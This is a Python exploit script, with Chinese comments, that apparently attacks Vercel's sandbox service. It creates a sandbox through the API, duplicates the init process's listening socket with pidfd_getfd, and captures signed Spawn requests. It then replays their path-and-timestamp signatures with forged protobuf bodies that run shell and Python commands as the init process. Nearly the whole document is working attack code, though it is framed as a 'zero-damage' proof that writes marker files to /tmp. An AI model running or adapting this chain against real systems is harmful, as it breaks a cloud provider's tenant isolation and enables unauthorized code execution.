# 实验J137: 签名重放攻击深度验证 — 暂停accept自劫持 + 完整chunked响应解析 + 攻击变体诊断
# 目标: j136 已确认签名格式=path+ts(不含body) 且无ts新鲜度检查; 但 PWN 文件未出现
# 本实验: 攻击前暂停 accept 竞争(避免自劫持), 完整解析 SpawnResponse, 四组变体定位执行失败原因
# 零破坏: 仅写 /tmp/PWN_VERCEL_SH|PY 证明
import json, time, urllib.request, urllib.error, sys, threading
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj137"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, socket, ctypes, time, threading, json, base64, subprocess, struct, sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
libc.getsockopt.restype = ctypes.c_int

def sc(nr, *args):
    ctypes.set_errno(0)
    r = libc.syscall(nr, *args)
    return r, ctypes.get_errno()

# [1] pubkey
pub = None
for a in open("/proc/1/cmdline", "rb").read().split(b"\x00"):
    if a.startswith(b"--pubkey="):
        pub = a[len(b"--pubkey="):]
print("PUBKEY_RAW:", pub.decode() if pub else "NONE", flush=True)
if pub:
    raw = base64.b64decode(pub)
    der = bytes.fromhex("302a300506032b6570032100") + raw
    pem = (b"-----BEGIN PUBLIC KEY-----\n" + base64.b64encode(der) +
           b"\n-----END PUBLIC KEY-----\n")
    open("/root/pub.pem", "wb").write(pem)
    print("PUBKEY_OK len=%d" % len(raw), flush=True)

# [2] fd 复制
fdmap = {}
for fd in sorted(os.listdir("/proc/1/fd"), key=int):
    try:
        fdmap[int(fd)] = os.readlink("/proc/1/fd/" + fd)
    except Exception:
        pass
print("FDMAP:", json.dumps(fdmap), flush=True)
pfd, e = sc(434, 1, 0)
print("PIDFD:", pfd, e, flush=True)

listener_nfd = None
if pfd >= 0:
    for fd, ln in fdmap.items():
        if "socket:" not in ln:
            continue
        nfd, e2 = sc(438, pfd, fd, 0)
        if nfd < 0:
            continue
        v = ctypes.c_int(0)
        l = ctypes.c_int(4)
        r = libc.getsockopt(nfd, 1, 30, ctypes.byref(v), ctypes.byref(l))
        if r == 0 and v.value == 1:
            listener_nfd = nfd
            print("LISTENER fd=%d nfd=%d" % (fd, nfd), flush=True)
            break

captured = []
stop = threading.Event()
accept_pause = threading.Event()

def verify(msg, sig):
    open("/root/m.bin", "wb").write(msg)
    open("/root/s.bin", "wb").write(sig)
    r = subprocess.run(["openssl", "pkeyutl", "-verify", "-pubin", "-inkey",
                        "/root/pub.pem", "-rawin", "-in", "/root/m.bin",
                        "-sigfile", "/root/s.bin"], capture_output=True, timeout=15)
    return r.returncode == 0

def sfield(f, v):
    b = v.encode() if isinstance(v, str) else v
    out = bytearray()
    tag = (f << 3) | 2
    while tag > 0x7f:
        out.append((tag & 0x7f) | 0x80)
        tag >>= 7
    out.append(tag)
    ln = len(b)
    while ln > 0x7f:
        out.append((ln & 0x7f) | 0x80)
        ln >>= 7
    out.append(len(b))
    return bytes(out) + b

def proto_parse(b):
    out = []
    i = 0
    while i < len(b):
        tag = b[i]
        i += 1
        fn = tag >> 3
        wt = tag & 7
        if wt == 0:
            v = 0
            shift = 0
            while i < len(b):
                x = b[i]
                i += 1
                v |= (x & 0x7f) << shift
                shift += 7
                if not (x & 0x80):
                    break
            out.append((fn, "varint", v))
        elif wt == 2:
            ln = 0
            shift = 0
            while i < len(b):
                x = b[i]
                i += 1
                ln |= (x & 0x7f) << shift
                shift += 7
                if not (x & 0x80):
                    break
            out.append((fn, "bytes", b[i:i + ln]))
            i += ln
        else:
            out.append((fn, "wt%d" % wt, b[i:]))
            break
    return out

def recv_http_resp(s):
    f = s.makefile("rb")
    status = f.readline()
    headers = {}
    while True:
        line = f.readline()
        if line in (b"\r\n", b"\n", b""):
            break
        if b":" in line:
            k, _, v = line.partition(b":")
            headers[k.strip().lower()] = v.strip()
    body = b""
    try:
        if headers.get(b"transfer-encoding", b"").lower() == b"chunked":
            while True:
                szl = f.readline()
                sz = 0
                try:
                    sz = int(szl.split(b";")[0].strip(), 16)
                except Exception:
                    break
                if sz <= 0:
                    break
                body += f.read(sz)
                f.readline()
        else:
            cl = headers.get(b"content-length")
            if cl:
                body = f.read(int(cl))
    except Exception:
        pass
    f.close()
    s.close()
    return status, headers, body

attack_ctx = {}

def do_attack(name, proto):
    env = b"\x00" + struct.pack(">I", len(proto)) + proto
    payload = (b"POST " + attack_ctx["path"].encode() + b" HTTP/1.1\r\n"
               b"Host: localhost\r\n"
               b"Content-Type: application/connect+proto\r\n"
               b"Connect-Protocol-Version: 1\r\n"
               b"X-Signature: " + attack_ctx["sig"].encode() + b"\r\n"
               b"X-Timestamp: " + attack_ctx["ts"].encode() + b"\r\n"
               b"Content-Length: " + str(len(env)).encode() + b"\r\n\r\n" + env)
    for attempt in range(2):
        s = None
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(8)
            s.connect("/run/vercel/share/init.sock")
            s.sendall(payload)
            status, headers, body = recv_http_resp(s)
            s = None
            print("TEST[%s] %s body_len=%d hex=%s" % (name, status.strip(), len(body), body[:96].hex()), flush=True)
            if len(body) >= 5 and body[0] == 0:
                try:
                    print("TEST[%s] resp_proto=%r" % (name, proto_parse(body[5:])), flush=True)
                except Exception as ex:
                    print("TEST[%s] parse_err %r" % (name, ex), flush=True)
            return
        except Exception as ex:
            print("TEST[%s] attempt%d EXC %r" % (name, attempt, ex), flush=True)
            if s is not None:
                try:
                    s.close()
                except Exception:
                    pass
            time.sleep(1)

if listener_nfd is None:
    print("NO_LISTENER", flush=True)
else:
    srv = socket.fromfd(listener_nfd, socket.AF_UNIX, socket.SOCK_STREAM)
    srv.settimeout(0.8)

    def accept_loop():
        while not stop.is_set():
            if accept_pause.is_set():
                time.sleep(0.2)
                continue
            try:
                conn, _ = srv.accept()
                conn.settimeout(4)
                data = b""
                while True:
                    try:
                        c = conn.recv(65536)
                    except socket.timeout:
                        break
                    if not c:
                        break
                    data += c
                    if len(data) > 262144:
                        break
                if data:
                    captured.append((time.time(), data))
                    print("CAP len=%d" % len(data), flush=True)
                conn.close()
            except socket.timeout:
                continue
            except OSError as ex:
                print("ACCEPT_ERR: %r" % (ex,), flush=True)
                time.sleep(0.3)

    threading.Thread(target=accept_loop, daemon=True).start()

    print("READY", flush=True)
    deadline = time.time() + 50
    attacked = False
    while time.time() < deadline:
        if not attacked:
            while captured:
                t, req = captured.pop(0)
                try:
                    head, _, body = req.partition(b"\r\n\r\n")
                    lines = head.decode("latin1").split("\r\n")
                    parts = lines[0].split(" ")
                    if len(parts) < 2:
                        continue
                    path = parts[1]
                    if not path.endswith("/Spawn"):
                        print("SKIP path=%s" % path, flush=True)
                        continue
                    hs = {}
                    for l in lines[1:]:
                        if ":" in l:
                            k, v = l.split(":", 1)
                            hs[k.strip().lower()] = v.strip()
                    sigb = hs.get("x-signature")
                    ts = hs.get("x-timestamp")
                    if not sigb or not ts:
                        continue
                    sig = base64.b64decode(sigb)
                    pbody = body[5:] if len(body) >= 5 and struct.unpack(">I", body[1:5])[0] == len(body) - 5 else body
                    if verify(path.encode() + ts.encode(), sig):
                        print("VERIFY_OK path+ts ts=%s body=%d" % (ts, len(body)), flush=True)
                        attack_ctx["path"] = path
                        attack_ctx["ts"] = ts
                        attack_ctx["sig"] = sigb
                        attack_ctx["orig"] = pbody
                        accept_pause.set()
                        time.sleep(0.5)
                        do_attack("replay_orig", pbody)
                        do_attack("evil_echo", sfield(1, "echo") + sfield(2, "PWN-REPLAY-OK") + sfield(4, "/vercel/sandbox"))
                        do_attack("evil_sh", sfield(1, "/bin/sh") + sfield(2, "-c") + sfield(2, "echo PWN-SH > /tmp/PWN_VERCEL_SH") + sfield(4, "/vercel/sandbox"))
                        do_attack("evil_py", sfield(1, "python3") + sfield(2, "-c") + sfield(2, "open('/tmp/PWN_VERCEL_PY','w').write('PWNED-PY')") + sfield(4, "/vercel/sandbox"))
                        attacked = True
                        print("ATTACK_SEQ_DONE", flush=True)
                    else:
                        print("VERIFY_FAIL ts=%s" % ts, flush=True)
                except Exception as ex:
                    print("PROC_ERR: %r" % (ex,), flush=True)
        time.sleep(0.2)

    stop.set()
    time.sleep(0.5)
    for name in ("/tmp/PWN_VERCEL_SH", "/tmp/PWN_VERCEL_PY"):
        try:
            if os.path.exists(name):
                print("PWN_FILE %s: %r" % (name, open(name).read()), flush=True)
            else:
                print("PWN_FILE %s: MISSING" % name, flush=True)
        except Exception as ex:
            print("PWN_CHECK %s EXC %r" % (name, ex), flush=True)

print("DONE", flush=True)
"""

print(">> 启动沙箱内捕获+攻击(50s), 本地触发 cmd", flush=True)
t0 = time.time()

def trigger():
    time.sleep(5)
    for i in range(40):
        try:
            body = {"command": "echo", "args": ["t%d" % i], "wait": True, "logs": True, "timeout": 100}
            c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
            print(f"  trigger[{i}] -> {c}", flush=True)
        except Exception as ex:
            print(f"  trigger[{i}] EXC {ex}", flush=True)
        time.sleep(1.0)

th = threading.Thread(target=trigger, daemon=True)
th.start()
run_cmd(sid, PROBE, "replay-deep", wait=True, timeout=300000)
th.join(timeout=1)

c2, r2 = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
             {"command": "ls", "args": ["-la", "/tmp/PWN_VERCEL_SH", "/tmp/PWN_VERCEL_PY"],
              "wait": True, "logs": True, "timeout": 100})
print(f"=== verify-pwn status {c2} ===", flush=True)
print(r2[:800], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done, elapsed=%.0fs" % (time.time() - t0), flush=True)
